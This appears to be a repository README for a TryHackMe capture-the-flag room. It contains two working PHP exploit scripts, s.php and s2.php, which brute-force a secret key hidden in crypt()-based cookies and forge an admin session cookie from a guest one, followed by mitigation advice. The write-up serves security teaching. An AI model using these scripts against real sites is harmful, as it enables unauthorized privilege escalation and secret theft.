## TryHackMe Crypto Failures Exploitation

This repository contains two PHP scripts that demonstrate common cryptographic vulnerabilities encountered in web applications, specifically from the TryHackMe "Crypto Failures" room. These scripts are designed to help understand and exploit weaknesses related to cookie handling, hashing, and secret key management.
s.php: Cookie Secret Key Brute-Force (User-Agent Length Manipulation)

This script exploits a vulnerability where a secret key, used in the generation of a secure_cookie, can be brute-forced by manipulating the User-Agent header length. The server appears to be using a crypt()-like function where the input string length, combined with the User-Agent, influences the resulting hash stored in the cookie. By carefully controlling the User-Agent length, we can isolate and brute-force characters of the secret key one by one.
Vulnerability Explanation

The core of this vulnerability lies in how the secure_cookie is generated. It appears to be a hash of a concatenated string including the username, User-Agent, and a secret key (ENC_SECRET_KEY). The crypt() function in PHP, when used with a salt, produces a hash. If the server's verification logic checks a specific part of this hash against a known value, and the input string's length (influenced by the User-Agent) causes predictable changes in the hash, a length extension or similar padding-related attack becomes possible.

Specifically, the script targets a scenario where the last character of the ENC_SECRET_KEY can be guessed by observing the secure_cookie's structure when the User-Agent length is varied.
How s.php Works

    Initialization:

        $url: The target URL of the web application.

        $ENC_SECRET_KEY: An empty string that will be populated character by character.

        $payload: A string containing all possible characters for the secret key.

    get_cookie_from_url function:

        Sends a HEAD request to the target URL with a specified User-Agent.

        Parses the Set-Cookie header from the response to extract secure_cookie and user.

    Brute-Force Loop:

        The main loop iterates from a User-Agent length of 176 down to 1. This length is crucial as it manipulates the input string length for the crypt() function on the server side, allowing the script to align the hash blocks.

        Inside the loop:

            A User-Agent string is created by repeating "i" for the current length $i.

            Cookies are fetched using this User-Agent.

            The secure_cookie and username are extracted.

            A candidate string $c_string is formed: username:user_agent:ENC_SECRET_KEY.

            The $c_octet_len is calculated, which seems to determine which part of the secure_cookie corresponds to the hash of the last 7 characters of $c_string plus the next character of the secret key.

            The script then iterates through each character in $payload. For each character, it constructs a test string ($last7.$p) and computes its crypt() hash using the first two characters of the secure_cookie as the salt.

            If the computed hash matches the relevant part of the secure_cookie, the character $p is appended to $ENC_SECRET_KEY, and the loop breaks to find the next character.

        The loop continues until the ENC_SECRET_KEY ends with a } character, indicating the flag has been found.

## Usage

    Set the URL: Modify the $url variable in s.php to your target URL.

    $url ="http://10.10.195.87/"; // CHANGE THIS TO YOUR TARGET URL

    Run the script:

    php s.php

    The script will print the discovered characters of the secret key as it finds them, and finally the complete ENC_SECRET_KEY.

s.php Script

<?php
//$url = "CHANGE_THIS";
$url ="http://10.10.195.87/";

$ENC_SECRET_KEY = "";
$payload = " !\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~";
$parts_payload = str_split($payload,1);
//GET REQUEST FOR COOKIE
function get_cookie_from_url($url , $user_agent){
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch,CURLOPT_HEADER,true);
    curl_setopt($ch, CURLOPT_NOBODY,  true);
    curl_setopt($ch, CURLOPT_USERAGENT,$user_agent);
    $response = curl_exec($ch);
    curl_close($ch);
    preg_match_all('/^Set-Cookie:\s*(.*)$/mi', $response, $matches);
    $cookie_array = [];
    if (!empty($matches[1])) {
        foreach ($matches[1] as $cookie) {
            $cookieParts = explode('=', $cookie, 2);
            $cookieValue = explode(';', $cookieParts[1])[0];
            $cookie_array[trim($cookieParts[0])] = trim($cookieValue) ;
        }
        return $cookie_array;
    }
    return ;
}
//FLAG BRUTE FORCE
//$i = CHANGE_THIS;
for ($i=176 ; $i>0; $i--){
    if (substr($ENC_SECRET_KEY, -1) == "}" ){
        break;
    }
    $user_agent = str_repeat("i", $i );
    $cookie_array=get_cookie_from_url($url, $user_agent);
    $s_cookie= $cookie_array['secure_cookie'] ;
    $username = $cookie_array['user'];
    $c_string = $username.":".$user_agent.":".$ENC_SECRET_KEY;
    $c_octet_len = count(str_split($c_string,8));
    $parts_of_scookie = str_split(urldecode($s_cookie),13);
    $hash= $s_cookie[0]. $s_cookie[1];
    if(strlen($c_string) %8 == 7){
        $last7 = substr($c_string, -7);
    }
    foreach($parts_payload as $p){
        if ($parts_of_scookie[$c_octet_len - 1] == crypt($last7.$p, $hash)){
            echo "found: ". $p."\n";
            $ENC_SECRET_KEY .= $p;
            break;
        }
    }
}
echo $ENC_SECRET_KEY ;
?>

s2.php: Cookie Forgery (Weak Hashing with crypt())

## This script demonstrates how a session cookie can be forged to elevate privileges (e.g., from guest to admin) when the server uses a weak or predictable hashing mechanism like crypt() for session tokens. The vulnerability arises if the cookie contains a hash of user-specific data (like username), and the salt used for hashing is easily extractable or predictable.
Vulnerability Explanation

The crypt() function in PHP, while useful for password hashing, is not suitable for generating session tokens or verifying user roles in a way that prevents forgery. If the salt is part of the cookie itself (e.g., the first two characters), an attacker can easily extract it. Knowing the salt and the input string format (e.g., "guest:Mo"), an attacker can then compute the hash for a desired role (e.g., "admin:Mo") and replace the original hash in the cookie, effectively forging a new, privileged cookie.
How s2.php Works

    Hardcoded Cookie: The script starts with a hardcoded guest cookie string. This cookie is assumed to be obtained from a legitimate guest session.

    Salt Extraction: The first two characters of the cookie are extracted as the $salt. This is a common pattern for crypt() output where the salt is prepended to the hash.

    Hash Calculation for Guest: The script calculates the crypt() hash for the string "guest:Mo" using the extracted salt. This represents the part of the cookie that signifies the guest user.

    Hash Calculation for Admin: Similarly, it calculates the crypt() hash for "admin:Mo" using the same extracted salt. This is the desired admin hash.

    Cookie Replacement: The str_replace() function is used to find all occurrences of the guest_part hash within the original cookie and replace them with the newly computed admin_part hash.

    Output: The modified cookie string, now containing the admin hash, is printed. This forged cookie can then be used in a web browser to attempt to gain admin access.

Usage

    Obtain a Guest Cookie: First, you would need to obtain a valid guest cookie from the target application. Replace the hardcoded $cookie variable in s2.php with your obtained cookie.

    $cookie = "pGrU6qDu0epOopGwG.ztylepwopGcL8j47VvjfspGq8.XcQA.qlApGAV0ASgKhWFApGVycaYH81JeApGD9LnfhScOCEpG48br.UgmQKspG4exPb2XH0w6pGI.C1JU8OWH.pGF5mAHUplDk2pG.dmapUrBygkpGjfDmkVJMtlIpGalu8RyY1ZhkpGs76e8wyDHYMpGVCxYiWJW5LkpGY2UMQb3DMpUpGTw2kevRD5f2pGQAb%2Fpmg1Q3YpGXpUplDQe7OspGuSqgUWN6mTEpGbufakrx394kpG3u.Hla%2FHIOMpGVYYoGXWgJ%2FQpG9Mh9dbBWCYcpGAYNH045UIdApGdoCLFXT63LspGfGGplqb3GU.pGEiEEWx2J5y6"; // REPLACE WITH YOUR GUEST COOKIE

    Run the script:

    php s2.php

    The script will output the forged admin cookie.

    Use the Forged Cookie: Copy the outputted cookie and use a browser extension (e.g., "EditThisCookie") to replace your current session cookie for the target website with the forged one. Refresh the page to see if you have gained admin privileges.

s2.php Script

<?php

$cookie = "pGrU6qDu0epOopGwG.ztylepwopGcL8j47VvjfspGq8.XcQA.qlApGAV0ASgKhWFApGVycaYH81JeApGD9LnfhScOCEpG48br.UgmQKspG4exPb2XH0w6pGI.C1JU8OWH.pGF5mAHUplDk2pG.dmapUrBygkpGjfDmkVJMtlIpGalu8RyY1ZhkpGs76e8wyDHYMpGVCxYiWJW5LkpGY2UMQb3DMpUpGTw2kevRD5f2pGQAb%2Fpmg1Q3YpGXpUplDQe7OspGuSqgUWN6mTEpGbufakrx394kpG3u.Hla%2FHIOMpGVYYoGXWgJ%2FQpG9Mh9dbBWCYcpGAYNH045UIdApGdoCLFXT63LspGfGGplqb3GU.pGEiEEWx2J5y6";


$salt = substr($cookie,0,2);

$text = "guest:Mo";
$guest_part = crypt($text, $salt);

$admin_text = "admin:Mo";
$admin_part = crypt($admin_text, $salt);


$modified_cookie = str_replace($guest_part, $admin_part, $cookie);

print($modified_cookie);

?>

Mitigation Strategies

## To prevent these types of cryptographic failures, consider the following best practices:

    Strong Hashing Algorithms: Never use crypt() for session management or sensitive data verification within cookies. Instead, use modern, strong, and secure hashing algorithms like Argon2, bcrypt, or scrypt for password storage. For session tokens, use cryptographically secure random strings.

    Secure Session Management:

        Generate session IDs using a cryptographically secure pseudorandom number generator (CSPRNG).

        Store session data on the server-side, associating it with a unique, unguessable session ID.

        Do not include sensitive user information (like username or role) directly in the session cookie in a way that can be tampered with or easily reverse-engineered.

        Use HttpOnly and Secure flags for cookies to prevent client-side script access and ensure transmission over HTTPS.

        Implement proper session expiration and invalidation.

    Input Validation and Sanitization: Always validate and sanitize all user-supplied input, including HTTP headers like User-Agent, to prevent injection attacks and unexpected behavior.

    Key Management: If symmetric encryption is used for cookies, ensure that the encryption key is:

        Strong and long enough.

        Generated securely.

        Stored securely and never exposed.

        Rotated regularly.

    Message Authentication Codes (MACs): When signing cookies or other data to prevent tampering, use a strong MAC (e.g., HMAC-SHA256) with a secret key known only to the server. This ensures the integrity and authenticity of the data.

    Avoid Predictable Data: Do not use predictable or easily guessable data as part of cryptographic inputs (e.g., predictable User-Agent strings).

    Regular Security Audits: Conduct regular code reviews and security audits to identify and remediate cryptographic weaknesses.

## Disclaimer

These scripts are provided for educational purposes only to demonstrate cryptographic vulnerabilities. Do not use them against any systems without explicit permission from the owner. Unauthorized access or modification of systems is illegal and unethical.
